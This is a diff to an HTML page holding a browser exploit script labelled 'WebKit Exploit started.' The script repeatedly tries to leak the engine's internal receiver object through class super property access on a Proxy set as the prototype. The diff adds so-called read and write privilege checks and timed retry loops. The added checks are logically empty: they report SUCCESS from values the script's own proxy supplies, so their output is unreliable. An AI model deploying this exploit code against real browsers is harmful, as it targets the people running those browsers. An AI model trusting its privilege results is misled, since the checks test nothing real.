@@ -36,15 +36,81 @@
 <script>
 document.addEventListener('DOMContentLoaded', function () {
     const logElement = document.getElementById('log');
+    let logBuffer = [];
 
     function log(message) {
         const timestamp = new Date().toISOString();
-        logElement.textContent += `[${timestamp}] ${message}\n`;
-        logElement.scrollTop = logElement.scrollHeight;
+        logBuffer.push(`[${timestamp}] ${message}`);
+        
+        // Update log every 20 messages
+        if (logBuffer.length >= 20) {
+            logElement.textContent += logBuffer.join("\n") + "\n";
+            logBuffer = [];
+            logElement.scrollTop = logElement.scrollHeight; // Scroll to bottom
+        }
         console.log(message);
     }
 
     log("WebKit Exploit started.");
+
+    function checkReadPrivilege() {
+        let foo = 42;
+        let readSuccess = false;
+
+        class Leaker {
+            leak() {
+                try {
+                    const result = super.foo;  // Attempt to read
+                    readSuccess = result === 42;  // Check if we got the expected result
+                } catch (error) {
+                    log("Read privilege check failed.");
+                }
+                return readSuccess;
+            }
+        }
+
+        Leaker.prototype.__proto__ = new Proxy({}, {
+            get(target, propertyName, receiver) {
+                if (propertyName === "foo") {
+                    return 42; // Fallback value for 'foo'
+                }
+                return receiver;
+            }
+        });
+
+        const { leak } = new Leaker();
+        return leak();
+    }
+
+    function checkWritePrivilege() {
+        let writeSuccess = false;
+        let receiver;
+
+        class Leaker {
+            leak() {
+                try {
+                    super.foo = {};  // Attempt to write
+                    writeSuccess = true;
+                } catch (error) {
+                    log("Write privilege check failed.");
+                }
+                return writeSuccess;
+            }
+        }
+
+        Leaker.prototype.__proto__ = new Proxy({}, {
+            set(target, propertyName, value, __receiver) {
+                if (propertyName === "foo") {
+                    receiver = __receiver;
+                    return true; // Allow setting 'foo'
+                }
+                return false;
+            }
+        });
+
+        const { leak } = new Leaker();
+        return leak();
+    }
 
     function tryToLeakThisViaGetById() {
         let foo = 42;
@@ -59,7 +125,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 if (propertyName === "foo") {
                     return 42; // Fallback value for 'foo'
                 }
-                return receiver; // Return the receiver for other properties
+                return receiver;
             }
         });
 
@@ -79,12 +145,12 @@ document.addEventListener('DOMContentLoaded', function () {
         Leaker.prototype.__proto__ = new Proxy({}, {
             get(target, propertyName, receiver) {
                 if (propertyName === "foo") {
-                    return 42; // Fallback value for 'foo'
+                    return 42;
                 }
                 if (propertyName === "bar") {
-                    return 84; // Fallback value for 'bar'
+                    return 84;
                 }
-                return receiver; // Return the receiver for other properties
+                return receiver;
             }
         });
 
@@ -106,10 +172,10 @@ document.addEventListener('DOMContentLoaded', function () {
         Leaker.prototype.__proto__ = new Proxy({}, {
             set(target, propertyName, value, __receiver) {
                 if (propertyName === "foo") {
-                    receiver = __receiver; // Capture the receiver
+                    receiver = __receiver;
                     return true;
                 }
-                return false; // Prevent setting other properties
+                return false;
             }
         });
 
@@ -132,10 +198,10 @@ document.addEventListener('DOMContentLoaded', function () {
         Leaker.prototype.__proto__ = new Proxy({}, {
             set(target, propertyName, value, __receiver) {
                 if (propertyName === "foo" || propertyName === "bar") {
-                    receiver = __receiver; // Capture the receiver
+                    receiver = __receiver;
                     return true;
                 }
-                return false; // Prevent setting other properties
+                return false;
             }
         });
 
@@ -144,8 +210,13 @@ document.addEventListener('DOMContentLoaded', function () {
     }
 
     // Limit the number of iterations for debugging purposes
-    const MAX_ITERATIONS = 100; // Reduce the iterations for troubleshooting
-    for (var i = 0; i < MAX_ITERATIONS; i++) {
+    const MAX_ITERATIONS = 20; // Reduce the iterations for troubleshooting
+    function runIteration(i) {
+        if (i >= MAX_ITERATIONS) {
+            log("All iterations completed.");
+            return;
+        }
+
         try {
             log(`Iteration ${i}: Starting attempt`);
 
@@ -161,16 +232,25 @@ document.addEventListener('DOMContentLoaded', function () {
             const result4 = tryToLeakThisViaSetByVal();
             log(`tryToLeakThisViaSetByVal: ${result4}`);
 
+            const readSuccess = checkReadPrivilege();
+            log(`Read privilege check: ${readSuccess ? "SUCCESS" : "FAILED"}`);
+
+            const writeSuccess = checkWritePrivilege();
+            log(`Write privilege check: ${writeSuccess ? "SUCCESS" : "FAILED"}`);
+
             if (i % 10 === 0) {
                 log(`Iteration ${i} completed successfully.`);
             }
         } catch (error) {
             log(`Error encountered at iteration ${i}: ${error.message}`);
-            break; // Exit loop on failure
         }
+
+        // Schedule next iteration with a delay
+        setTimeout(() => runIteration(i + 1), 100); // 100ms delay
     }
 
-    log("All leak attempts completed.");
+    // Start the iteration process
+    runIteration(0);
 });
 </script>
 
